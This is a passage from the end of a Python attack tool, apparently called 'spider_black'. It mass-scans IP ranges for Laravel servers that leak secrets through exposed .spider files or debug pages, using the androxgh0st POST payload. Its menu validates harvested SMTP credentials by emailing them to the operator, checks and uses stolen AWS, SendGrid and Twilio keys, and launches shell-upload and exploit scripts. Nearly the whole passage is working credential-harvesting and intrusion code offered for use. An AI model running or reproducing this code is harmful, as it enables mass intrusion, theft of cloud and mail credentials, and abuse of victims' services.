    zm.map(jembotngw4, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread5():
  file_location = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}")
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      rotation += 1
      ip_grabberautoscan(lines,sites_len,rotation)
  
def makethread14():
  file_location = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your Sendgrid Apikey List : {cn}") 
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  for lines in fresh_lines_sites:
      sendgridcheck(lines)

def makethread6():
  file_location = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}") 
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      ip_grabber(lines,sites_len,rotation)

def makethread8():
    ipstart = input(f"{lrd}[{lgn}?{lrd}] {lgn}start ip : {cn}") 
    ip1 = ipstart.strip().split('.')
    ipto = input(f"{lrd}[{lgn}?{lrd}] {lgn}to ip : {cn}")
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      jembotngw2(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def makethread9():
    ipstart = input(f"{lrd}[{lgn}?{lrd}] {lgn}start ip : {cn}") 
    ip1 = ipstart.strip().split('.')
    ipto = input(f"{lrd}[{lgn}?{lrd}] {lgn}to ip : {cn}") 
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      dorkscan(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def nowayngntd2():

  Targetssa = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}") 
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare2(site)
    else:
      prepare2(sites)



def makethread2(jumlah):
  try:
    nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}") 
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass


def makethread29(jumlah):
  try:
    nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}") 
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(exploit, liss)
  except Exception as e:
    pass



def checkweb(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                
                live2 = open('Result/good Spider.txt', 'a')
                live2.write(str(ori)+'/.spider'+ '\n')
                live.close()
                live2.close()
        else:
                get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source3:
                    with lock:
                        print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
                    live = open('Result/good ips.txt', 'a')
                    live.write(str(ori)+ '\n')
                    live2 = open('Result/good debug.txt', 'a')
                    live2.write(str(ori)+ '\n')
                    live.close()
                    live2.close()
                else:
                    get_source5 = requests.get('https://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                    if "APP_KEY" in str(get_source5):
                        with lock:
                            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good Spider.txt', 'a')
                            live2.write(str(ori)+'/.spider'+ '\n')
                            live.close()
                            live2.close()
                    else:
                            get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                            if "<td>APP_KEY</td>" in get_source6:
                                with lock:
                                    print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
                                live = open('Result/good ips.txt', 'a')
                                live.write(str(ori)+ '\n')
                                live2 = open('Result/good debug.txt', 'a')
                                live2.write(str(ori)+ '\n')
                                live.close()
                                live2.close()
                            else:
                                with lock:
                                    print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')
                        
            
    except:
        with lock:
            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')
        pass

def checkweb2(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good Spider.txt', 'a')
                live2.write(str(ori)+'/.spider'+ '\n')
                dorkscan(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscan(url)
          else:
              get_source5 = requests.get('https://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good Spider.txt', 'a')
                      live2.write(str(ori)+'/.spider'+ '\n')
                      dorkscan(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscan(url)
                  else:
                      with lock:
                          print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')

    except:
        with lock:
            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')
        pass

def checkweb3(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good Spider.txt', 'a')
                live2.write(str(ori)+'/.spider'+ '\n')
                dorkscansave(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscansave(url)
          else:
              get_source5 = requests.get('https://'+url+'/.spider', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider')
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good Spider.txt', 'a')
                      live2.write(str(ori)+'/.spider'+ '\n')
                      dorkscansave(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .debug')
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscansave(url)
                  else:
                      get_source6 = requests.get('http://'+url+'/.spider.save', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                      if "APP_KEY" in str(get_source6):
                        with lock:
                            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {gn}Good | .Spider.save')
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good spider-save.txt', 'a')
                            live2.write(str(ori)+'/.spider.save'+ '\n')
                            dorkscansave(url)
                      else:
                        with lock:
                            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')

    except:
        with lock:
            print(f'{lrd}[{lgn}!{lrd}] {lgn}{url} => {rd}Bad')
        pass

threads17 = []
threads18 = []
threads19 = []
threads20 = []
threads22 = []

def sendsmtptest(host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)

        if "unknown@unknown.com" in sender and "@" in user:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))

        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        # specify the sender’s and receiver’s email addresses

        receiver_email = str(fsetting)
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "| HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
              <p>-------------------</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
          with lock:
            print(f"{lgn}{user} | {yw}[SMTP SEND INFO] [GOOD] Sent To {str(fsetting)}")
            live = io.open('Result/smtptest/good.txt', 'a')
            live.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except (gaierror, ConnectionRefusedError):
            with lock:
                print(f"{lgn}{user} | {yw}[SMTP SEND INFO] {lrd}[BAD] Failed to connect to the server. Bad connection settings?")
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except smtplib.SMTPServerDisconnected:
            with lock:
                print(f"{lgn}{user} | {yw}[SMTP SEND INFO] {lrd} Failed to connect to the server. Wrong user/password?")
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except smtplib.SMTPException as e:
            with lock:
                print(f"{lgn}{user} | {yw}[SMTP SEND INFO] {lrd} SMTP error occurred: {str(e)}")
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')


def makethread17(jumlah):
  try:
    global threads17
    print(f"{lrd}[{lgn}!{lrd}] {lgn}input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253")
    ipsmin = input(f"{lrd}[{lgn}!{lrd}] {lgn}Start Ips : {cn}")
    ipsmax = input(f"{lrd}[{lgn}!{lrd}] {lgn}To Ips: {cn}")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        thread = threading.Thread(target=checkweb , args=(ip,))
        threads17.append(thread)
        thread.start()
        if len(threads17) == th:
            for i in threads17:
                i.join()
            threads17 = []

  except Exception as e:
    pass

def makethread18(jumlah):
  try:
    global threads18
    print(f"{lrd}[{lgn}!{lrd}] {lgn}input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253")
    ipsmin = input(f"{lrd}[{lgn}!{lrd}] {lgn}Start Ips : {cn}")
    ipsmax = input(f"{lrd}[{lgn}!{lrd}] {lgn}To Ips: {cn}")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb2 , args=(url,))
        threads18.append(thread)
        thread.start()
        if len(threads18) == th:
            for i in threads18:
                i.join()
            threads18 = []

  except Exception as e:
    pass

def makethread19(jumlah):
  try:
    global threads19
    th = int(jumlah)
    iplist= input(f"""
    {lrd}[{lgn}!{lrd}] {lgn}input your email to sendto.ini first for receive valid smtp
    {lrd}[{lgn}!{lrd}] {lgn}Format : host|port|user|password|fromemail(optional)
    {lrd}[{lgn}!{lrd}] {lgn}valid smtp will save in smtptest folder in result
    {lrd}[{lgn}!{lrd}] {lgn}Input Smtp lists file: {cn}""")
    lists = open(iplist, 'r').read().split('\n')
    for alist in lists:
        try:
            host,port,user,passw,fromw = alist.split('|')
        except Exception as e:
            print(e) 
            continue
        thread = threading.Thread(target=sendsmtptest , args=(host,port,user,passw,fromw))
        threads19.append(thread)
        thread.start()
        if len(threads19) == th:
            for i in threads19:
                i.join()
            threads19 = []

  except Exception as e:
    pass

def makethread20(jumlah):
  try:
    global threads20
    th = int(jumlah)
    iplist2= input(f"{lrd}[{lgn}!{lrd}] {lgn}Input iplist file: {cn}")
    lists = open(iplist2, 'r').read().split('\n')
    for alist in lists:
        try:
            ipss = alist.split('|')
        except Exception as e:
            print(e)
            continue
        thread = threading.Thread(target=reverseip , args=(ipss))
        threads20.append(thread)
        thread.start()
        if len(threads20) == th:
            for i in threads20:
                i.join()
            threads20 = []

  except Exception as e:
    pass

def makethread22(jumlah):
  try:
    global threads22
    print(f"{lrd}[{lgn}!{lrd}] {lgn}input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253")
    ipsmin = input(f"{lrd}[{lgn}!{lrd}] {lgn}Start Ips : {cn}")
    ipsmax = input(f"{lrd}[{lgn}!{lrd}] {lgn}To Ips: {cn}")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb3 , args=(url,))
        threads22.append(thread)
        thread.start()
        if len(threads22) == th:
            for i in threads18:
                i.join()
            threads22 = []

  except Exception as e:
    print(e)

def cracksespisah():
  nam = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input AWS KEY List : ") 
  lista = open(nam, 'r').read().split('\n')
  totalnum = len(lista)
  print(f'{lrd}[{lgn}#{lrd}] {lgn}Threads Number  : {cn}' , end='')

  threadnum = int(input())

  threads = []

  for i in lista:
    try:
        ACCESS_KEY,SECRET_KEY,REGION = i.split('|')
        thread = threading.Thread(target=autocreate , args=(ACCESS_KEY.strip(),SECRET_KEY.strip(),REGION.strip()))
        threads.append(thread)
        thread.start()
        if len(threads) == threadnum:
            for i in threads:
                i.join()
                threads = []
    except:
        continue



def spider_black():
  try:
    menucit()
    Targetssad = input(f"{lrd}[{lgn}?{lrd}] {lgn}Choice : {cn}") 
    if Targetssad == "1":

      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread(jumlahkn)
      else:
        nowayngntd()
    elif Targetssad == "3":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] :{cn} ") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread3(jumlahkn)
      else:
        makethread3(1)
    elif Targetssad == "4":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread4(jumlahkn)
      else:
        makethread4(1)
    elif Targetssad == "5":
      makethread5()
      
    elif Targetssad == "6":
      makethread6()
    elif Targetssad == "7":
      autodork()
    elif Targetssad == "8":
      makethread8()
    elif Targetssad == "9":
      makethread9()
    elif Targetssad == "10":
      clean()
    elif Targetssad == "11":
      awskey = input(f"{lrd}[{lgn}?{lrd}] {lgn}AWS KEY : {cn}") 
      seckey = input(f"{lrd}[{lgn}?{lrd}] {lgn}SECRET KEY : {cn}") 
      reg = input(f"{lrd}[{lgn}?{lrd}] {lgn}REGION :{cn} ") 
      awslimitcheck(awskey,seckey,reg)
    elif Targetssad == "12":
      cracksespisah()
    elif Targetssad == "13":
      twillio_sender()
    elif Targetssad == "14":
      makethread14()
    elif Targetssad == "15":
      print(f'{lrd}[{lgn}#{lrd}] {lgn}TOTAL KEY  : {cn}' , end='')
      totalkey = int(input())
      i = 0
      while i < totalkey:
          i+=1
          print_key_sendgrid()
    elif Targetssad == "17":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread17(jumlahkn)
      else:
        makethread17(1)
    elif Targetssad == "18":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread18(jumlahkn)
      else:
        makethread18(1)
    elif Targetssad == "19":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread19(jumlahkn)
      else:
        makethread19(1)
    elif Targetssad == "20":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread20(jumlahkn)
      else:
        makethread20(1)
    elif Targetssad == "22":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread22(jumlahkn)
      else:
        makethread22(1)
    elif Targetssad == "16":
      print('[X] TOTAL KEY  : ' , end='')
      totalkey = int(input())
      print('[X] REGION (ex: us-east-1) : ' , end='')
      region = str(input())
      i = 0
      while i < totalkey:
          i+=1
          print_key_aws(region)    
    elif Targetssad == "2":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread2(jumlahkn)
      else:nowayngntd2()
    elif Targetssad == "24":os.system('python files/shell-upload.py')
    elif Targetssad == "25":os.system('python files/data.py ip.txt') 
    elif Targetssad == "26":os.system('perl files/attack.pl -u 2.txt -t 10')       
    elif Targetssad == "27":os.system('python files/nexmo-api.py') 
    elif Targetssad == "28":os.system('python files/format.py')
    elif Targetssad == "29":
      Targetssas = input(f"{lrd}[{lgn}?{lrd}] {lgn}With thread or no [y/n] : {cn}") 
      if Targetssas == "y":
        jumlahkn = input(f"{lrd}[{lgn}?{lrd}] {lgn}Thread : {cn}") 
        makethread29(jumlahkn)
    elif Targetssad == "30":os.system('cmd /k "py woo.py"')        
    else:
      if os.name == "nt":
        try:os.system("cls")
	except:os.system("clear")
      else:
        pass
      logo()
      spider_black()

  except KeyboardInterrupt as e:
    print(f"{lrd}[{lgn}!{lrd}] {lrd}Exit Program")
    sys.exit()

def computeMD5hash(my_string):
    m = hashlib.md5()
    m.update(my_string.encode('utf-8'))
    return m.hexdigest()


spider_black()
